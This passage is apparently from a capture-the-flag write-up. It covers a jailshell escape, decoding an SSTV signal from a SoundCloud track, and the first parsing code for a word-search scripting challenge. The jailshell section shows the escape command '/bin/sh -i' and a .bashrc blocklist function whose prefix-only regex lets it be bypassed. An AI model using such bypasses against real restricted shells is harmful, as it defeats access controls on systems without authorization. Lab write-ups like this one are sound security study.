&lt;p&gt;This challenge generously gives us a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash&lt;/code&gt; shell on the server at the jump. The catch is that we’re placed into an extremely restrictive &lt;em&gt;jailshell&lt;/em&gt;. If we attempt to use many of our common commands, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whoami&lt;/code&gt;, the shell yells at us for using a &lt;em&gt;“bad word”&lt;/em&gt;. Thankfully after testing several options, we finally have success with the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh -i&lt;/code&gt;. This breaks us out of the jailshell and drops us into a non-restricted &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sh&lt;/code&gt; shell. A few &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; commands reveals the path to the flag file in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/just/out/of/reach/flag.txt&lt;/code&gt;, which we can &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; to retrieve the flag: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag{2d43e30a358d3f30fe65cc47a9cbbe98}&lt;/code&gt;.&lt;/p&gt;

&lt;script id=&quot;asciicast-sWZbiP6eNtBDOr0cDSGhfDY7Z&quot; src=&quot;https://asciinema.org/a/sWZbiP6eNtBDOr0cDSGhfDY7Z.js&quot; async=&quot;&quot;&gt;&lt;/script&gt;

&lt;p&gt;If you want to know how the jailshell works, its code is contained within the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bashrc&lt;/code&gt; file. It defines a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bad_words()&lt;/code&gt; function that compares each argument in a user’s commands against a list of &lt;em&gt;“bad words”&lt;/em&gt;. Then using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;trap 'bad_words' DEBUG&lt;/code&gt; command, it forces this function to run before any command is executed by the user. If one of the arguments matches one of the bad words, it stops the user’s command from running. However, we are able to get past it because it only checks for bad words starting from the &lt;em&gt;beginning&lt;/em&gt; of the argument. This is because of the regex they’re using for matching (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;^$i.*&lt;/code&gt;). The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;^&lt;/code&gt; character anchors the match to only from the beginning of the string. So although &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sh&lt;/code&gt; &lt;strong&gt;is&lt;/strong&gt; a bad word, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; goes undetected because the preceding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/&lt;/code&gt; breaks the match.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nb&quot;&gt;shopt&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; extdebug
&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;bad_words&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;declare&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;arr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;alert&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;egrep&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;fgrep&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;grep&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;l&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;la&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ll&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ls&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...] &lt;span class=&quot;s2&quot;&gt;&quot;less&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;lessecho&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;flag&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;root&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[@]&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;do
        if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BASH_COMMAND&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;~ ^&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
            &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;You said a bad word, &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;!!&quot;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;done
    return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;trap&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'bad_words'&lt;/span&gt; DEBUG
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;osint&quot;&gt;OSINT&lt;/h1&gt;

&lt;h2 id=&quot;jed-sheeran-50-points&quot;&gt;Jed Sheeran (50 points)&lt;/h2&gt;
&lt;p&gt;This challenge asks us to look for an aspiring music artist named &lt;em&gt;Jed Sheeran&lt;/em&gt;. The actual discovery process is simple because a Google search for “Jed Sheeran” puts his &lt;em&gt;SoundCloud&lt;/em&gt; as the first result. Jed’s profile has one song that contains a mess of beeps and squeaks.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/imgs/hacktivity2021/jed_1.png&quot; alt=&quot;Jed's SoundCloud&quot; title=&quot;Jed's SoundCloud&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This sound is actually a &lt;a href=&quot;https://www.sigidwiki.com/wiki/Slow-Scan_Television_(SSTV)&quot;&gt;&lt;em&gt;Slow-Scan Television (SSTV)&lt;/em&gt;&lt;/a&gt; signal, a method to transmit images as an analog signal. SSTV is popular within the amateur radio community particularly because it’s a way to send and receive images using very little bandwidth. It’s also common to see this in &lt;em&gt;augmented reality games (ARG)&lt;/em&gt; or easter eggs as a way to hide pictures, like here in &lt;a href=&quot;https://www.youtube.com/watch?v=GZvb6Hswu1o&quot;&gt;Portal 2.&lt;/a&gt; So to retrieve the flag from this audio file, all we need to do is decode the SSTV signal it’s playing.&lt;/p&gt;

&lt;p&gt;One way to do it is to download an SSTV decoder app like &lt;a href=&quot;https://play.google.com/store/apps/details?id=xdsopl.robot36&amp;amp;hl=en_US&amp;amp;gl=US&quot;&gt;Robot36&lt;/a&gt; and hold your phone’s microphone up to your computer speakers. But you need to keep in mind that SSTV is an &lt;em&gt;analog&lt;/em&gt; signal. So any noise in the signal will cause us to receive a degraded image. The more noise, the worse the image looks. However, we could use a something called a &lt;em&gt;virtual audio cable&lt;/em&gt;, such as &lt;a href=&quot;https://vb-audio.com/Cable/&quot;&gt;VB-CABLE&lt;/a&gt;, to connect our browser’s audio directly to an SSTV decoder program, like &lt;a href=&quot;https://www.qsl.net/on6mu/rxsstv.htm&quot;&gt;RX-SSTV&lt;/a&gt;. This will theoretically send the SSTV signal directly from SoundCloud to our decoder without &lt;em&gt;any&lt;/em&gt; noise.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/imgs/hacktivity2021/jed_2.png&quot; alt=&quot;Connecting VB-CABLE&quot; title=&quot;Connecting the VB-CABLE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/imgs/hacktivity2021/jed_3.png&quot; alt=&quot;Decoding SSTV&quot; title=&quot;Decoding SSTV&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Well… the flag is clearly there, but it’s extremely hard to decipher. A lot of things could be happening here. SoundCloud could be compressing the SSTV audio before it’s stored, causing additional distortion in our image. It could also be that the flag’s text is too small for this SSTV mode. SSTV isn’t exactly known for sending extremely clear images, even in a perfect world. So people normally use bigger text in an image to compensate for that or switch to a more “robust” SSTV mode. The Jed Sheeran signal appears to be using the &lt;em&gt;Robot 36&lt;/em&gt; mode and is about 36 seconds long. Compare this to the following SSTV image I picked up from the &lt;em&gt;International Space Station&lt;/em&gt; that uses &lt;em&gt;PD120&lt;/em&gt; and is about 120 seconds long. It has text about the same size as the Jed Sheeran signal, but this time it’s actually intelligible. Keep in mind that I received this signal &lt;em&gt;from space&lt;/em&gt;, as well.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/imgs/hacktivity2021/jed_iss_example.jpg&quot; alt=&quot;ISS SSTV Image&quot; title=&quot;ISS SSTV Image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So where do we go from here? We could try &lt;em&gt;really hard&lt;/em&gt; to determine what each character is. But, it seems that the challenge creator recognized how hard this was and decided to just put the flag in the song’s description: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag{59e56590445321ccefb4d91bba61f16c}&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/imgs/hacktivity2021/jed_flag.png&quot; alt=&quot;Jed Sheeran Flag&quot; title=&quot;Jed Sheeran Flag&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;scripting&quot;&gt;Scripting&lt;/h1&gt;

&lt;h2 id=&quot;words-church-407-points&quot;&gt;Words Church (407 points)&lt;/h2&gt;
&lt;p&gt;It appears that people either don’t like scripting or just don’t know how to script because these challenges ended up being worth &lt;em&gt;a lot&lt;/em&gt; of points. The description tells us we’ll have to solve 30 word searches, so let’s connect to the server and see what we’re dealing with.&lt;/p&gt;

&lt;script id=&quot;asciicast-O6lzg08iqC82LAaBW2sdvATk4&quot; src=&quot;https://asciinema.org/a/O6lzg08iqC82LAaBW2sdvATk4.js&quot; async=&quot;&quot;&gt;&lt;/script&gt;

&lt;p&gt;It looks fairly simple. We’re provided with a \(15 \times 15\) grid of characters and five words to find. The biggest challenge is really going to be how to parse everything. &lt;a href=&quot;https://docs.pwntools.com/en/latest/&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwntools&lt;/code&gt;&lt;/a&gt; makes the sending and receiving part of the challenge easy, so all we have to worry about is how to process the information. The following &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3&lt;/code&gt; script let’s use receive the grid used for the game:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'challenge.ctf.games'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32497&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'play'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Header lines
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Grid lines 
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Trailing lines
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After putting this into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3&lt;/code&gt; interpreter, we verify that we’re correctly aligned to process the grid.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;Python 3.9.2 (default, Feb 28 2021, 17:03:44)
[GCC 10.2.1 20210110] on linux
Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
&amp;gt;&amp;gt;&amp;gt; from pwn import *
&amp;gt;&amp;gt;&amp;gt; io = remote('challenge.ctf.games', 32497)
('&amp;gt;')
io.send('play')[x] Opening connection to challenge.ctf.games on port 32497
[x] Opening connection to challenge.ctf.games on port 32497: Trying 34.122.187.139
[+] Opening connection to challenge.ctf.games on port 32497: Done
&amp;gt;&amp;gt;&amp;gt; io.recvuntil('&amp;gt;')
b&quot;Words Church v1.0\n\n
Let's play a game of wordsearch! We will display the grid\n
and offer you words to find. Please submit the locations of\n
each word in the format [(X,Y), (X,Y), (X,Y), ...] for each letter.\n\n
Please enter 'example' if you would like to see an \n
example, or 'play' if you would like to get started.\n
&amp;gt;&quot;
&amp;gt;&amp;gt;&amp;gt; io.send('play')
&amp;gt;&amp;gt;&amp;gt;
&amp;gt;&amp;gt;&amp;gt; # Headers
&amp;gt;&amp;gt;&amp;gt; io.recvlines(3)
[b' Wordsearch # 1/30:',
 b'\t 0   1   2   3   4   5   6   7   8   9   10  11  12  13  14  15 : X',
 b'\t--- --- --- --- --- --- --- --- --- --- --- --- --- --- --- ---']
&amp;gt;&amp;gt;&amp;gt;
&amp;gt;&amp;gt;&amp;gt; # Grid lines
&amp;gt;&amp;gt;&amp;gt; io.recvlines(16)
[b' 0  | \t L   P   U   C   E   U   N   K   F   C   A   Q   T   Q   S   H ',
 b' 1  | \t Q   L   Q   Q   K   E   S   P   U   V   A   W   X   T   M   E ',
 b' 2  | \t E   G   O   U   H   O   U   A   Q   D   S   K   Z   M   T   Y ',
 b' 3  | \t L   Z   S   I   F   O   S   U   J   S   S   E   N   A   O   V ',
 b' 4  | \t I   S   M   V   D   Y   B   B   U   G   U   O   N   J   D   J ',
 b' 5  | \t S   J   Q   E   T   N   L   A   V   K   R   K   Z   W   S   I ',
 b' 6  | \t C   P   C   R   Y   S   E   L   K   D   E   P   S   X   A   L ',
 b' 7  | \t Q   Q   T   E   W   F   Z   L   I   M   D   E   U   S   C   O ',
 b' 8  | \t T   G   L   D   N   N   T   Y   J   K   I   S   Y   L   S   B ',
 b' 9  | \t N   E   Q   J   I   I   X   H   S   K   B   L   K   O   H   S ',
 b' 10 | \t V   K   M   I   U   V   U   O   K   S   K   T   Y   E   I   T ',
 b' 11 | \t I   M   N   F   G   V   S   O   Z   O   S   H   R   T   T   E ',
 b' 12 | \t H   F   Y   K   F   S   Q   S   Z   J   I   I   Z   T   J   R ',
 b' 13 | \t H   U   X   E   T   R   Y   N   R   Z   J   M   Z   S   U   S ',
 b' 14 | \t F   R   B   D   P   Z   K   P   K   U   N   G   A   Q   Y   O ',
 b' 15 | \t M   S   O   T   B   F   R   P   F   R   R   P   M   M   Z   T ']
&amp;gt;&amp;gt;&amp;gt;
&amp;gt;&amp;gt;&amp;gt; # Trailing lines
&amp;gt;&amp;gt;&amp;gt; io.recvlines(2)
[b' ---',
 b'  Y ']
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Translating the grid into a 2D-array is fairly trivial. All we have to do is split each line on whitespace to get a list of all characters, and then skip the first two characters that contain the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Y&lt;/code&gt; coordinate and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;|&lt;/code&gt; separator. The following code does this for us:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;c1&quot;&gt;# Process grid lines
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# Decode the input from a bytestring into a normal string
&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# ^─────────────────────────┐
&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# Split the string on whitespace, returning a list of each
&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# ^    character in the string
&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# └─────────────────────────│───────────────┐
&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# Skip the first two characters in the new list
&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# ^─────────────────────────│───────────────│──────┐
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;grid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Test grid
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;grid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Output
&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
[['L', 'P', 'U', 'C', 'E', 'U', 'N', 'K', 'F', 'C', 'A', 'Q', 'T', 'Q', 'S', 'H'],
 ['Q', 'L', 'Q', 'Q', 'K', 'E', 'S', 'P', 'U', 'V', 'A', 'W', 'X', 'T', 'M', 'E'],
 ['E', 'G', 'O', 'U', 'H', 'O', 'U', 'A', 'Q', 'D', 'S', 'K', 'Z', 'M', 'T', 'Y'],
 ['L', 'Z', 'S', 'I', 'F', 'O', 'S', 'U', 'J', 'S', 'S', 'E', 'N', 'A', 'O', 'V'],
 ['I', 'S', 'M', 'V', 'D', 'Y', 'B', 'B', 'U', 'G', 'U', 'O', 'N', 'J', 'D', 'J'],
 ['S', 'J', 'Q', 'E', 'T', 'N', 'L', 'A', 'V', 'K', 'R', 'K', 'Z', 'W', 'S', 'I'],
 ['C', 'P', 'C', 'R', 'Y', 'S', 'E', 'L', 'K', 'D', 'E', 'P', 'S', 'X', 'A', 'L'],
 ['Q', 'Q', 'T', 'E', 'W', 'F', 'Z', 'L', 'I', 'M', 'D', 'E', 'U', 'S', 'C', 'O'],
 ['T', 'G', 'L', 'D', 'N', 'N', 'T', 'Y', 'J', 'K', 'I', 'S', 'Y', 'L', 'S', 'B'],
 ['N', 'E', 'Q', 'J', 'I', 'I', 'X', 'H', 'S', 'K', 'B', 'L', 'K', 'O', 'H', 'S'],
 ['V', 'K', 'M', 'I', 'U', 'V', 'U', 'O', 'K', 'S', 'K', 'T', 'Y', 'E', 'I', 'T'],
 ['I', 'M', 'N', 'F', 'G', 'V', 'S', 'O', 'Z', 'O', 'S', 'H', 'R', 'T', 'T', 'E'],
 ['H', 'F', 'Y', 'K', 'F', 'S', 'Q', 'S', 'Z', 'J', 'I', 'I', 'Z', 'T', 'J', 'R'],
 ['H', 'U', 'X', 'E', 'T', 'R', 'Y', 'N', 'R', 'Z', 'J', 'M', 'Z', 'S', 'U', 'S'],
 ['F', 'R', 'B', 'D', 'P', 'Z', 'K', 'P', 'K', 'U', 'N', 'G', 'A', 'Q', 'Y', 'O'],
 ['M', 'S', 'O', 'T', 'B', 'F', 'R', 'P', 'F', 'R', 'R', 'P', 'M', 'M', 'Z', 'T']]
&quot;&quot;&quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The next step is to determine how to receive the words we need to search for. After we receive the grid lines, the questions are sent to us in the following format: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LIEU: &amp;gt; &lt;/code&gt;. All we need to do here is extract the word, which is very easy to do using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;split()&lt;/code&gt; again.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;c1&quot;&gt;# Receive input until we hit the '&amp;gt;' character
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;question&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# Split the line on the ':' character and take everything before the ':'
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;question&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;':'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

